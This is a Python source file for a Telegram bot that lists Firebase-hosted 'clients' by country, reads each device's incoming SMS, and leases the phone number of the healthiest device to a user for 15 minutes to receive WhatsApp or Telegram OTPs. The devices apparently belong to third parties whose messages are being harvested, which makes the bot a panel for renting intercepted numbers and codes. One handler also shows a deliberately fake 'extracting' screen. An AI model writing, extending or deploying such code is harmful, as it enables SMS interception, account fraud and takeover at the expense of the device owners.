import time
from aiogram import Router, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup
from aiogram.fsm.context import FSMContext

import database as db
import firebase_utils as fbu
from utils.ui import sc, btn
from utils.helper import is_owner, get_countries, clear_user_lease, get_ist_time_str
from states import S

user_router = Router()

@user_router.message(F.text == "/start")
async def user_start(message: Message, state: FSMContext):
    await state.clear()
    uid = message.from_user.id
    d = db.load_data()
    
    if uid in d.get("banned", []):
        return await message.answer("You are banned.")

    is_vip = uid in d.get("vip_users", [])
    
    # Check active lease
    lease = d.get("user_leases", {}).get(str(uid))
    if lease and time.time() < lease["expire_at"]:
        return await show_active_number(message, uid, lease)

    kb_buttons = []
    if is_vip:
        kb_buttons.append([btn("vvip numbers", "vvip_start", "⭐"), btn("get number", "get_number_start", "📱")])
    else:
        kb_buttons.append([btn("get number", "get_number_start", "📱")])
        
    kb_buttons.append([btn("my numbers", "my_numbers", "📞"), btn("otp history", "otp_history", "📜")])
    
    # Upcoming OTPs button (agar timer laga hai)
    timers = d.get("upcoming_timers", {})
    user_timers = [k for k, v in timers.items() if v["user_id"] == uid]
    if user_timers:
        kb_buttons.append([btn("upcoming ws otps", "view_timers", "⏰")])

    kb = InlineKeyboardMarkup(inline_keyboard=kb_buttons)
    await message.answer(f"👋 <b>{sc('main menu')}</b>\n\nWelcome {message.from_user.first_name}!", reply_markup=kb, parse_mode="HTML")

# --- VVIP FLOW ---
@user_router.callback_query(F.data == "vvip_start")
async def vvip_countries(call: CallbackQuery):
    d = db.load_data()
    countries = get_countries(d)
    kb = []
    for c in countries:
        kb.append([btn(c, f"vvip_country:{c}", "🌍")])
    kb.append([btn("back", "back_to_main", "🔙")])
    
    await call.message.edit_text("⭐ <b>VVIP NUMBERS</b>\nSelect Country:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@user_router.callback_query(F.data.startswith("vvip_country:"))
async def vvip_services(call: CallbackQuery):
    country = call.data.split(":")[1]
    services = ["WhatsApp", "Telegram", "Any"]
    kb = []
    for s in services:
        kb.append([btn(s, f"vvip_service:{country}:{s}", "📱")])
    kb.append([btn("back", "vvip_start", "🔙")])
    
    await call.message.edit_text(f"⭐ <b>VVIP: {country}</b>\nSelect Service:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

# --- GET NUMBER (NORMAL) ---
@user_router.callback_query(F.data == "get_number_start")
async def get_number_countries(call: CallbackQuery):
    d = db.load_data()
    countries = get_countries(d)
    kb = []
    for c in countries:
        kb.append([btn(c, f"gn_country:{c}", "🌍")])
    kb.append([btn("back", "back_to_main", "🔙")])
    
    await call.message.edit_text("📱 <b>GET NUMBER</b>\nSelect Country:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@user_router.callback_query(F.data.startswith("gn_country:"))
async def gn_servers(call: CallbackQuery):
    country = call.data.split(":")[1]
    d = db.load_data()
    fbs = [fb for fb in d.get("firebases", []) if fb.get("country", "India") == country]
    servers = [{"url": fb["url"], "name": fb.get("name", "Server"), "url_str": fb.get("url", "")} for fb in fbs]
    
    kb = []
    # Max 50 servers to avoid limit
    for i, srv in enumerate(servers[:50]):
        kb.append([btn(f"Server {i+1}", f"gn_srv:{country}:{i}", "🔥")])
    kb.append([btn("back", "get_number_start", "🔙")])
    
    await call.message.edit_text(f"📱 <b>Servers for {country}</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

# --- RENT & FIREBASE FETCHING ---
@user_router.callback_query(F.data.startswith("gn_srv:"))
async def fetch_and_rent(call: CallbackQuery):
    _, country, srv_idx = call.data.split(":")
    srv_idx = int(srv_idx)
    d = db.load_data()
    
    fbs = [fb for fb in d.get("firebases", []) if fb.get("country", "India") == country]
    if srv_idx >= len(fbs): return await call.answer("Server not found.")
    
    fb = fbs[srv_idx]
    await call.message.edit_text("⏳ <i>Fetching base...</i>", parse_mode="HTML")
    
    # Fetch clients
    clients = await fbu.fetch_fb(f"{fb['url']}/clients.json?shallow=true", fb.get("auth"))
    if not clients:
        return await call.message.edit_text("❌ No clients found on this server.")
    
    # Find best device (Health logic + Number)
    best_dev = None
    best_health = -1
    for dev_id in clients.keys():
        dev_data = await fbu.fetch_fb(f"{fb['url']}/clients/{dev_id}.json", fb.get("auth"))
        if dev_data:
            msgs = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5", fb.get("auth"))
            msgs_list = [v for v in msgs.values() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs else []
            
            health = fbu.calculate_health(msgs_list)
            best_nums = fbu.extract_best_numbers(dev_data, msgs_list)
            
            if best_nums:
                num, conf = best_nums[0]
                if health > best_health:
                    best_health = health
                    best_dev = {
                        "id": dev_id,
                        "number": num,
                        "health": health,
                        "msgs": msgs_list,
                        "ws_chance": fbu.get_ws_chance(msgs_list)
                    }
    
    if not best_dev:
        return await call.message.edit_text("❌ Could not extract a valid number.")

    # Save lease
    d = db.load_data()
    d["user_leases"][str(call.from_user.id)] = {
        "fb_url": fb['url'],
        "dev_id": best_dev["id"],
        "expire_at": time.time() + 900, # 15 mins
        "last_msg_id": int(best_dev["msgs"][0].get("id", 0)) if best_dev["msgs"] else 0,
        "top_number": best_dev["number"]
    }
    db.save_data(d)
    
    # Text Generation
    is_vip = call.from_user.id in d.get("vip_users", [])
    health_emoji = "❤️" if best_dev["health"] >= 8 else "💔"
    chance_emoji = "📊"
    
    text = (
        f"📱 <b>DETAILS</b>\n"
        f"🔥 <b>SRV:</b> {srv_idx + 1} | <b>Base:</b> {len(clients)}\n"
        f"🆔 <b>Rent ID:</b> <code>{best_dev['id']}</code>\n"
        f"⚙️ <b>Health:</b> {best_dev['health']}T | {health_emoji} <b>{best_dev['health']}/10</b>\n"
        f"{chance_emoji} <b>CHANCE:</b> {best_dev['ws_chance']}%\n"
        f"📞 <code>+91{best_dev['number']}</code> | 100%\n"
    )
    
    if is_owner(call.from_user.id):
        text += f"\n🔗 <b>URL:</b> <code>{fb['url']}</code>"

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [btn("copy number", f"copy_{best_dev['number']}", "📋")],
        [btn("info", "info_btn", "ℹ️"), btn("save number", "save_num_btn", "⭐")],
        [btn("set timer", "set_timer_btn", "⏰")],
        [btn("next number", "get_number_start", "🔄"), btn("stop", "stop_lease", "⏹")],
        [btn("back", "back_to_main", "🔙")]
    ])
    
    await call.message.edit_text(text, reply_markup=kb, parse_mode="HTML")

# --- UPCOMING OTPs (Clickable) ---
@user_router.callback_query(F.data == "view_timers")
async def view_timers(call: CallbackQuery):
    d = db.load_data()
    uid = call.from_user.id
    timers = {k: v for k, v in d.get("upcoming_timers", {}).items() if v["user_id"] == uid}
    
    if not timers:
        return await call.answer("No active timers.")
        
    kb = []
    for key, t in timers.items():
        num = t["number"]
        # Yahan click karne par direct fetching interface khulega
        kb.append([btn(f"📞 {num} ({get_ist_time_str(t['target_time'])})", f"timer_click:{num}", "⏰")])
    kb.append([btn("back", "back_to_main", "🔙")])
    
    await call.message.edit_text("⏰ <b>Your Upcoming OTPs</b>\nClick a number to open the fetching interface:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@user_router.callback_query(F.data.startswith("timer_click:"))
async def timer_click(call: CallbackQuery):
    num = call.data.split(":")[1]
    # Yahan hum fake ek lease assign karenge taaki wo "Extracting..." screen dikhe
    # Asal me timer wale numbers ka lease nahi hota, par tera flow kehta hai click karne pe interface aaye
    await call.message.edit_text(
        f"⏳ <b>EXTRACTING NUMBER...</b>\n\n📞 <code>+91{num}</code>\n\n<i>Connecting to server...</i>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("back", "view_timers", "🔙")]])
    )
